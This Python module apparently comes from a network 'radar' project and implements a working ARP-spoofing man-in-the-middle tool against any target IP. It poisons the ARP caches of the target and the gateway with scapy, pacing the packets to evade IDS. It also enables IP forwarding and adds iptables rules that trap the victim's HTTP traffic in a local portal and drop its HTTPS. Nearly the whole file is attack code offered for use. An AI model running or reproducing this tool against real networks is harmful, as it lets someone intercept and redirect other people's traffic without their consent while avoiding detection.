import time
import logging
import signal
import sys
import threading
from scapy.all import ARP, send, get_if_hwaddr, get_if_addr, conf
from radar.utils.helpers import get_default_gateway_ip

logger = logging.getLogger("radar.tactical")

class ArpRedirector:
    """
    Tactical ARP Redirector (Spoofer).
    Intercepts unicast traffic from a target device to see 'Outside' intelligence.
    """
    
    def __init__(self, target_ip, gateway_ip=None, interface=None):
        self.target_ip = target_ip
        self.interface = interface or conf.iface
        self.gateway_ip = gateway_ip or get_default_gateway_ip()
        self.running = False
        
        # Get MACs
        self.local_mac = get_if_hwaddr(self.interface)
        self.target_mac = self._get_mac(self.target_ip)
        self.gateway_mac = self._get_mac(self.gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            raise Exception(f"Could not resolve MAC addresses for {target_ip} or {self.gateway_ip}")

    def _get_mac(self, ip):
        from scapy.all import srp, Ether
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=2, verbose=False)
        for _, r in ans:
            return r[Ether].src
        return None

    def _poison(self):
        """Sends stealthy ARP responses to redirect traffic."""
        from scapy.all import Ether, sendp
        
        # Tell Target that LOCAL is GATEWAY
        # Layer 2: Dest MAC must be Target MAC
        pkt_target = Ether(dst=self.target_mac)/ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
        
        # Tell Gateway that LOCAL is TARGET
        # Layer 2: Dest MAC must be Gateway MAC
        pkt_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)
        
        while self.running:
            try:
                sendp(pkt_target, verbose=False, iface=self.interface)
                sendp(pkt_gateway, verbose=False, iface=self.interface)
                # Stealth: Sleep 10s between pulses to avoid triggering IDS/Watchdogs
                time.sleep(10)
            except Exception as e:
                logger.error(f"Poisoning error: {e}")
                break

    def _enable_ip_forwarding(self):
        """Enables Linux kernel IP forwarding for packet routing."""
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            return True
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {e}. You may need to run: sudo sysctl -w net.ipv4.ip_forward=1")
            return False

    def start(self):
        print(f"📡 [TACTICAL] Starting redirection for {self.target_ip}...")
        print(f"🎯 Target: {self.target_ip} ({self.target_mac})")
        print(f"🌐 Gateway: {self.gateway_ip} ({self.gateway_mac})")
        
        if not self._enable_ip_forwarding():
            print("⚠️ WARNING: IP Forwarding could not be enabled automatically.")
            print("Run this manually: sudo sysctl -w net.ipv4.ip_forward=1")
            
        import subprocess
        try:
            # 1. Clear any existing rules for this target to avoid duplicates
            subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], check=False)
            
            # 2. Force all HTTP traffic to our local portal
            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], check=True)
            
            # 3. DROP HTTPS traffic (Forces the OS to trigger a Captive Portal check)
            # We drop in both FORWARD (for normal routing) and INPUT (for DNS-spoofed local hits)
            subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-p", "tcp", "-s", self.target_ip, "--dport", "443", "-j", "DROP"], check=True)
            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "-s", self.target_ip, "--dport", "443", "-j", "DROP"], check=True)
            
            print("🔥 Aggressive MitM Active: HTTP trapped, HTTPS blackholed. Triggering OS auto-checks...")
        except Exception as e:
            logger.error(f"Failed to set aggressive rules: {e}")

        self.running = True
        self.thread = threading.Thread(target=self._poison, daemon=True)
        self.thread.start()
        
        print("✅ Redirection active. You can now see 'Outside' traffic in the main dashboard.")
        print("Press Ctrl+C to stop and restore network settings.")

    def stop(self):
        """Restores original ARP tables (Cleanup)."""
        from scapy.all import Ether, sendp
        print("\n🧹 [TACTICAL] Cleaning up and restoring network...")
        self.running = False
        
        # Restore Target: Tell Target that GATEWAY is back at GATEWAY MAC
        res_target = Ether(dst=self.target_mac)/ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        # Restore Gateway: Tell Gateway that TARGET is back at TARGET MAC
        res_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
        
        sendp(res_target, count=5, verbose=False, iface=self.interface)
        sendp(res_gateway, count=5, verbose=False, iface=self.interface)
        
        import subprocess
        try:
            subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], check=False)
            subprocess.run(["sudo", "iptables", "-D", "FORWARD", "-p", "tcp", "-s", self.target_ip, "--dport", "443", "-j", "DROP"], check=False)
            subprocess.run(["sudo", "iptables", "-D", "INPUT", "-p", "tcp", "-s", self.target_ip, "--dport", "443", "-j", "DROP"], check=False)
        except:
            pass

        print("✅ Network restored.")
        sys.exit(0)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 -m radar.fingerprint.tactical <target_ip>")
        sys.exit(1)
        
    target = sys.argv[1]
    redirector = ArpRedirector(target)
    
    def signal_handler(sig, frame):
        redirector.stop()
        
    signal.signal(signal.SIGINT, signal_handler)
    redirector.start()
    
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
